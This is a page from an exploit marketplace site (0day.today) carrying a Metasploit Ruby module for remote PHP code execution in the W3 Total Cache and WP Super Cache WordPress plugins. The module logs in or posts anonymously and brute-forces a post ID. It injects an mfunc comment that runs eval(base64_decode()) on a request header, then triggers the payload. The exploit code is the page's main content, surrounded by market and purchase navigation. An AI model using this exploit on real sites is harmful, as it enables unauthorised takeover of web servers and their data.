			<meta name='description' content=""> 
			<meta name='keywords' content=""> 
		
		<link rel='stylesheet' href='/style?1592054401' type='text/css' media='all' />
		<link rel='stylesheet' href='/skin/green?1592054401' type='text/css' media='all' />
		<link rel='stylesheet' href='/qtip_style' type='text/css' media='all' />
		<link rel='stylesheet' href='/fancybox_style' >
		<script type='text/javascript' src='/jquery'></script>
		<script type='text/javascript' src='/qtip_js'></script>
		<script type='text/javascript' src='/upl1'></script>
		<script type='text/javascript' src='/upl2'></script>
		<script type='text/javascript' src='/fancybox'></script>
		<script src='/chart_js'></script>
		<script type='text/javascript'>
			$(document).ready(function() {
				$('.popup').fancybox({
					fitToView	: true,
					autoSize	: true,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
				$('.popup_modal').fancybox({
					modal	: true, 
					width   : '100%',
					height  : '100%',
					fitToView	: true,
					autoSize	: false,
					closeClick	: false,
					
					openEffect	: 'elastic',
					closeEffect	: 'elastic'
				});
			});
		</script>
		<script type='text/javascript'>
			  var _gaq = _gaq || [];
			  _gaq.push(['_setAccount', 'UA-23466659-1']);
			  _gaq.push(['_trackPageview']);
			  (function() {
				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
			  })();
		</script>
	</head>
	<body  onload='onloadpage()' ><div class='menu' style='text-align:center; width:1200px;'>[ <a href='/'>home</a> ]&nbsp;&nbsp;[ <a href='/private' class=''>private</a> ]&nbsp;&nbsp;[ <a href='/0day' class='RedText'>0Day</a> ]&nbsp;&nbsp;[ <a href='/discount'>discount</a> ]&nbsp;&nbsp;[ <a href='/gold' class='YellowTextGold'> Get Gold </a> ]&nbsp;&nbsp;[ <a href='/platforms'>platforms</a> ]&nbsp;&nbsp;[ <a href='/pentest'>pentest</a> ]&nbsp;&nbsp;[ <a href='/hash'>hash</a> ]&nbsp;&nbsp;[ <a href='/search'>search</a> ]&nbsp;&nbsp;[ <a href='/faq' class='RedText'>faq</a> ]&nbsp;&nbsp;[ <a href='/contacts'>contact</a> ]&nbsp;&nbsp;[ <a href='/style/change' alt=''>style</a> ]&nbsp;&nbsp;[ <a href='/btc/change' class='YellowTextBtc'>Prices in Gold</a> ]&nbsp;&nbsp;&nbsp;<span class='YellowText'>db:</span> <span class='RedText'>34 387</span>&nbsp;&nbsp;&nbsp;&nbsp;<div class='menu_icon'><a title='0day Today Exploit DB Official Facebook' href='http://www.facebook.com/Inj3ct0rs' target='_Blank'><img src='/img/fb.png' alt='0day Today Exploit DB Official Facebook'></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official Twitter ' href='http://twitter.com/Inj3ct0r' target='_Blank'><img src='/img/tw.png' alt='0day Today Exploit DB Official Twitter '></a></div> <div class='menu_icon'><a title='0day Today Exploit DB Official RSS Channel' href='/rss' target='_Blank'><img src='/img/rss.png' alt='0day Today Exploit DB Official RSS Channel'></a></div> <div class='menu_icon'><a title='Tor Network' href='http://mvfjfugdwgc5uwho.onion' target='_Blank'><img src='/img/tor3.png' alt='Tor'></a></div> </div><div class='content'>
				<div class='popup_welcome ' id='popup_welcome_div'>
					<a href='#popup_welcome_div' class='popup' id='popup_welcome'>&nbsp;</a>
					<div class='pop_up_welcome_title'>
						<strong><span class='RedText'>0day.today - Biggest Exploit Database in the World.</span></strong>
						<div style='float:right; margin-top:-5px; heigth:24px; line-height:16px; '>
							<div style='float:left; margin-top:3px;'>Select your language: &nbsp;</div>
							<a class='' href='http://en.0day.today/exploit/20710'>
								<img src='/img/langs/en.png' alt='English'>
								<div class='TipText'>
									English
								</div>
							</a><a class='' href='http://ru.0day.today/exploit/20710'>
								<img src='/img/langs/ru.png' alt='Русский'>
								<div class='TipText'>
									Русский
								</div>
							</a><a class='' href='http://de.0day.today/exploit/20710'>
								<img src='/img/langs/de.png' alt='Deutsch'>
								<div class='TipText'>
									Deutsch
								</div>
							</a><a class='' href='http://tr.0day.today/exploit/20710'>
								<img src='/img/langs/tr.png' alt='Türkçe'>
								<div class='TipText'>
									Türkçe
								</div>
							</a><a class='' href='http://fr.0day.today/exploit/20710'>
								<img src='/img/langs/fr.png' alt='Français'>
								<div class='TipText'>
									Français
								</div>
							</a><a class='' href='http://it.0day.today/exploit/20710'>
								<img src='/img/langs/it.png' alt='Italiano'>
								<div class='TipText'>
									Italiano
								</div>
							</a><a class='' href='http://es.0day.today/exploit/20710'>
								<img src='/img/langs/es.png' alt='Español'>
								<div class='TipText'>
									Español
								</div>
							</a><a class='' href='http://ro.0day.today/exploit/20710'>
								<img src='/img/langs/ro.png' alt='Romania'>
								<div class='TipText'>
									Romania
								</div>
							</a><a class='' href='http://pl.0day.today/exploit/20710'>
								<img src='/img/langs/pl.png' alt='Polskie'>
								<div class='TipText'>
									Polskie
								</div>
							</a><a class='' href='http://ar.0day.today/exploit/20710'>
								<img src='/img/langs/ar.png' alt='العربية'>
								<div class='TipText'>
									العربية
								</div>
							</a><a class='' href='http://jp.0day.today/exploit/20710'>
								<img src='/img/langs/jp.png' alt='Japan'>
								<div class='TipText'>
									Japan
								</div>
							</a><a class='' href='http://cn.0day.today/exploit/20710'>
								<img src='/img/langs/cn.png' alt='China'>
								<div class='TipText'>
									China
								</div>
							</a>
						</div>
					</div>
					
					<div style='float:left; background:#000; width:480px; border-right:1px solid #004000; text-align:justify; margin:10px 0px 0px 0px; padding:0px 15px 0px 0px;'>
						<div class='centertext'><img src='/img/logo_green.jpg' style='width:400px;'></div>
						<div class='spacer'></div>
						Things you should know about 0day.today: 
						<ul>
						<li>We use one main domain: <a href='http://0day.today'>http://0day.today</a></li>
						<li>Most of the materials is <span class='YellowText'>completely FREE</span></li>
						<li>If you want to <span class='RedText'>purchase the exploit</span> / <span class='RedText'>get V.I.P. access</span>  or pay for any other service, <br>you need to buy or earn <img src='/img/gold.gif'> <span class='GoldText'>GOLD</span></li>
					</ul>
						
						<div class='spacer'></div>
						<div class='center'>
							We accept currencies: [<a href='/contacts' target=_blank>contact admin to find more</a>]
							<div class='half_spacer'></div>
							<a href='/gold'><img src='/img/bitcoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/litecoin.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							<a href='/gold'><img src='/img/ethereum.png' style='width:150px;'></a>&nbsp;&nbsp;&nbsp;
							
						</div>
						<div class='spacer'></div>
						<div class='spacer'></div>
						We don't want you to use our site as a tool for hacking purposes, so any kind of action that could 
			affect illegaly other users or websites that you don't have right to access will be banned 
			and your account including your data will be destroyed.<br><br>
			Administration of this site uses the <a href='/contacts' target=_blank>official contacts</a>. Beware of impostors!
						<div class='spacer'></div>
						<div class='spacer'></div>
						<div class='centertext'><a href='/popup/off' class='RedText'>I am registered user of 0day.today. I don't want to see this screen in future.</a></div>
						
					</div>
					<div style='float:left; background:#000; width:300px; padding:10px 0px;'>
						<center><strong><span class='RedText'>What to do first?</span></strong></center>
						<ol style='margin-left:25px;'>
							<li>Read the [ <a href='/law' target='_blank'>agreement</a> ]</li>
							<li>Read the [ <a href='/faq/how_publish' target='_blank'>Submit</a> ] rules</li>
							<li>Visit the [ <a href='/faq' target='_blank'>faq</a> ] page</li>
							<li>[ <a href='/reg' target='_blank'>Register</a> ] profile</li>
							<li>Get [ <a href='/gold' target='_blank'>GOLD</a> ]</li>
							<li>If you want to [ <a href='/faq/sell' target='_blank'>sell</a> ]</li>
							<li>If you want to [ <a href='/faq/buy' target='_blank'>buy</a> ]</li>
							<li>If you lost [ <a href='restore' target='_blank'>Account</a> ]</li>
							<li>Any questions [ <a href='mailto:admin@0day.today'>admin@0day.today</a> ]</li>
						</ol>
						<br>
						<br>
						
						<center><strong><span class='RedText'>Main links</span></strong></center>
						<ul style='margin-left:25px;'>
							<li><a href='/auth'>Authorisation page</a></li>
							<li><a href='/reg'>Registration page</a></li>
							<li><a href='/restore'>Restore account page</a></li>
							<li><a href='/faq'>FAQ page</a></li>
							<li><a href='/contacts'>Contacts page</a></li>
							<li><a href='/faq#submit'>Publishing rules</a></li>
							<li><a href='/law'>Agreement page</a></li>
						</ul>
						<br>
						<br>
						
						<center><strong><span class='RedText'>You can contact us by</span></strong></center><br>
						<div class='popup_contacts_items popup_contacts_mail'>
							<div class='popup_contacts_items_title '>Mail:</div> 
							<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
						</div>
						<!--<div class='popup_contacts_items popup_contacts_jabber'>
							<div class='popup_contacts_items_title '>Jabber:</span></strong></div> 
							<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
						</div>
						<div class='popup_contacts_items popup_contacts_skype'>
							<div class='popup_contacts_items_title '>Skype:</span></strong></div> 
							<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
						</div>
						-->
						<div class='popup_contacts_items popup_contacts_fb'>
							<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
						</div>
						<div class='popup_contacts_items popup_contacts_twitter'>
							<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
							<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
						</div>
					</div>
				</div>
		<div class='head_auth'>
				<div class='menu_icon'><img src='/img/lock.png'></a></div> 
				[ <a href='/auth' class='RedText'>authorization</a> ] 
				[ <a href='/reg' class='RedText'>registration</a> ] 
				[ <a href='/restore' class='RedText'>restore account</a> ] 
			</div>
			<div class='head_contacts '>
				<a href='#contacts_popup' class='popup'>
				<img src='/img/mail3.png'>
				Contact us
				<!--<img src='/img/skype.png'>
				<img src='/img/jabber.png'>-->
				
				</a>
			</div>
			<div id='contacts_popup'>
				<div class='category_text strong'><span class='RedText'>You can contact us by:</span> </div>
				<div class='spacer'></div>
				<div class='popup_contacts_page'>
					<div class='popup_contacts_items popup_contacts_mail'>
						<div class='popup_contacts_items_title '>Mail:</div> 
						<div class='popup_contacts_items_text'><a href='mailto:mr.inj3ct0r@gmail.com'>mr.inj3ct0r@gmail.com</a></div> 
					</div>
					
					<!--<div class='popup_contacts_items popup_contacts_jabber'>
						<div class='popup_contacts_items_title YellowText'>Jabber:</span></strong></div> 
						<div class='popup_contacts_items_text'>1337day@jabber.org</div> 
					</div>
					<div class='popup_contacts_items popup_contacts_skype'>
						<div class='popup_contacts_items_title YellowText'>Skype:</span></strong></div> 
						<div class='popup_contacts_items_text'>Inj3ct0rs</div> 
					</div>-->
					
					<div class='popup_contacts_items popup_contacts_fb'>
						<div class='popup_contacts_items_title '>Facebook:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='http://www.facebook.com/Inj3ct0rs' target='_blank'>Inj3ct0rs</a></div> 
					</div>
					<div class='popup_contacts_items popup_contacts_twitter'>
						<div class='popup_contacts_items_title '>Twitter:</span></strong></div>  
						<div class='popup_contacts_items_text'><a href='https://twitter.com/Inj3ct0r' target='_blank'>Inj3ct0r</a></div> 
					</div>
				</div>
			</div>
			
			
				<div class='head'>
					<div class='double_spacer'></div>
					<div class='double_spacer'></div><a href='/'><img src='/img/logo_green.jpg' alt='0day Today Exploits Market and 0day Exploits Database'></a>
					
					
				</div>
						
				
					<style>
					.fancybox-inner {
						background:#000000 url(/img/bg.gif);
					}
					.content{border:1px solid #008000; }
					</style>
					
						
						<script type='text/javascript' src='/hightlight_lib'></script>
						<script type='text/javascript' src='/hightlight/ruby'></script>
						
						<link type='text/css' rel='stylesheet' href='/hightlight_style?1592054401'/>
						<script type='text/javascript'>SyntaxHighlighter.all();</script>
						
						
						
						
							<div style='font-size:11px; font-weight:bold;'>
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Author</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/author/2911' target=_blank>metasploit</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Risk</div>
									<div style='float:left; width:190px; margin:5px 0px 0px 0px;' ><img src='/img/risk/critlow_4.gif'> [<span style='font-size:9px;'><div class='tips_risk_color_4'>Security Risk Critical</div></span>]</div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>0day-ID</div>
									<div style='float:left; margin:5px 0px 0px 0px;' ><a href='/exploit/description/20710' target=_blank>0day-ID-20710</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Category</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/remote'>remote exploits</a></div>
									
									<div style='float:left; width:80px; margin:5px 0px 0px 0px; font-weight:normal; color:#aaa'>Date add</div>
									<div style='float:left; width:190px;margin:5px 0px 0px 0px;' ><a href='/date/30-04-2013'>30-04-2013</a></div>
									
								<div class='clear'></div>
								
								
									<div style='float:left; width:80px; margin:5px 0px 0px 0px;font-weight:normal; color:#aaa'>Platform</div>
									<div style='float:left; width:150px; overflow:hidden; margin:5px 0px 0px 0px;' ><a href='/platforms/php'>php</a></div>
									
									
								<div class='clear'></div>
									
							</div>
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Description'    => %q{
        W3 Total Cache for versions up to and including 0.9.2.8.  WP Super Cache 1.2 or older
        is also reported as vulnerable.  The vulnerability is due to the handling of certain
        macros such as mfunc, which allows arbitrary PHP code injection.  A valid post ID is
        needed in order to add the malicious comment.  If the POSTID option isn't specified,
        then the module will automatically bruteforce one.  Also, if anonymous comments
        aren't allowed, then a valid username and password must be provided.  In addition,
        W3 Total Cache 0.9.2.3 on a Ubuntu 10.04 system.
      },
      'Author'  =>
        [
          'Unknown', # Vulnerability discovery
          'juan vazquez', # Metasploit module
          'hdm', # Metasploit module
          'Christian Mehlmauer' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '92652' ],
          [ 'BID', '59316' ],
          [ 'URL', 'http://www.acunetix.com/blog/web-security-zone/wp-plugins-remote-code-execution/' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Payload'        =>
        {
          'DisableNops' => true,
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 17 2013'
      ))

      register_options(
        [
          OptInt.new('POSTID', [ false, "The post ID where publish the comment" ]),
          OptString.new('USERNAME', [ false,  "The user to authenticate as (anonymous if username not provided)"]),
          OptString.new('PASSWORD', [ false,  "The password to authenticate with (anonymous if password not provided)" ])
        ], self.class)
  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def require_auth?
    @user = datastore['USERNAME']
    @password = datastore['PASSWORD']

    if @user and @password and not @user.empty? and not @password.empty?
      return true
    else
      return false
    end
  end

  def get_session_cookie(header)
    header.split(";").each { |cookie|
      cookie.split(" ").each { |word|
        if word =~ /(.*logged_in.*)=(.*)/
          return $1, $2
        end
      }
    }
    return nil, nil
  end

  def login
    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, "wp-login.php"),
        'method' => 'POST',
        'vars_post' => {
          'log' => @user,
          'pwd' => @password
        }
      })

    if res and res.code == 302 and res.headers['Set-Cookie']
      return get_session_cookie(res.headers['Set-Cookie'])
    else
      return nil, nil
    end

  end

  def check_post_id(uri)
    options = {
      'method' => 'GET',
      'uri'    => uri
    }
    options.merge!({'cookie' => "#{@cookie_name}=#{@cookie_value}"}) if @auth
    res = send_request_cgi(options)
    if res and res.code == 200 and res.body =~ /form.*action.*wp-comments-post.php/
      return true
    elsif res and (res.code == 301 or res.code == 302) and res.headers['Location']
      location = URI(res.headers["Location"])
      uri = location.path
      uri << "?#{location.query}" unless location.query.nil? or location.query.empty?
      return check_post_id(uri)
    end
    return false
  end

  def find_post_id
    (1..1000).each{|id|
      vprint_status("#{peer} - Checking POST ID #{id}...") if (id % 100) == 0
      res = check_post_id(normalize_uri(target_uri) + "/?p=#{id}")
      return id if res
    }
    return nil
  end

  def post_comment
    php_payload = "<!--mfunc if (sha1($_SERVER[HTTP_SUM]) == '#{@sum}' ) { eval(base64_decode($_SERVER[HTTP_CMD])); } --><!--/mfunc-->"

    vars_post = {
      'comment' => php_payload,
      'submit' => 'Post+Comment',
      'comment_post_ID' => "#{@post_id}",
      'comment_parent' => "0"
    }
    vars_post.merge!({
      'author' => rand_text_alpha(8),
      'email' => "#{rand_text_alpha(3)}@#{rand_text_alpha(3)}.com",
      'url' => rand_text_alpha(8),
    }) unless @auth

    options = {
      'uri' => normalize_uri(target_uri.path, "wp-comments-post.php"),
      'method' => 'POST'
    }
    options.merge!({'vars_post' => vars_post})
    options.merge!({'cookie' => "#{@cookie_name}=#{@cookie_value}"}) if @auth

    res = send_request_cgi(options)
    if res and res.code == 302
      location = URI(res.headers["Location"])
      uri = location.path
      uri << "?#{location.query}" unless location.query.nil? or location.query.empty?
      return uri
    else
      return nil
    end
  end

  def exploit

    @auth = require_auth?

    if @auth
      print_status("#{peer} - Trying to login...")
      @cookie_name, @cookie_value = login
      if @cookie_name.nil? or @cookie_value.nil?
        fail_with(Exploit::Failure::NoAccess, "#{peer} - Login wasn't successful")
      end
    else
      print_status("#{peer} - Trying unauthenticated exploitation...")
    end

    if datastore['POSTID'] and datastore['POSTID'] != 0
      @post_id = datastore['POSTID']
      print_status("#{peer} - Using the user supplied POST ID #{@post_id}...")
    else
      print_status("#{peer} - Trying to brute force a valid POST ID...")
      @post_id = find_post_id
      if @post_id.nil?
        fail_with(Exploit::Failure::BadConfig, "#{peer} - Unable to post without a valid POST ID where comment")
      else
        print_status("#{peer} - Using the brute forced POST ID #{@post_id}...")
      end
    end

    random_test = rand_text_alpha(64)
    @sum = Rex::Text.sha1(random_test)

    print_status("#{peer} - Injecting the PHP Code in a comment...")
    post_uri = post_comment
    if post_uri.nil?
      fail_with(Exploit::Failure::Unknown, "#{peer} - Expected redirection not returned")
    end

    print_status("#{peer} - Executing the payload...")
    options = {
      'method' => 'GET',
      'uri'    => post_uri,
      'headers' => {
        'Cmd' => Rex::Text.encode_base64(payload.encoded),
        'Sum' => random_test
      }
    }
    options.merge!({'cookie' => "#{@cookie_name}=#{@cookie_value}"}) if @auth
    res = send_request_cgi(options)
    if res and res.code == 301
      fail_with(Exploit::Failure::Unknown, "#{peer} - Unexpected redirection, maybe comments are moderated")
    end
  end

  def check
    res = send_request_cgi ({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    })

    if res.nil?
      return Exploit::CheckCode::Unknown
    end

    if res.headers['X-Powered-By'] and res.headers['X-Powered-By'] =~ /W3 Total Cache\/([0-9\.]*)/
      version = $1
      if version <= "0.9.2.8"
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    end

    if res.body and (res.body =~ /Performance optimized by W3 Total Cache/ or res.body =~ /Cached page generated by WP-Super-Cache/)
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown

  end
end

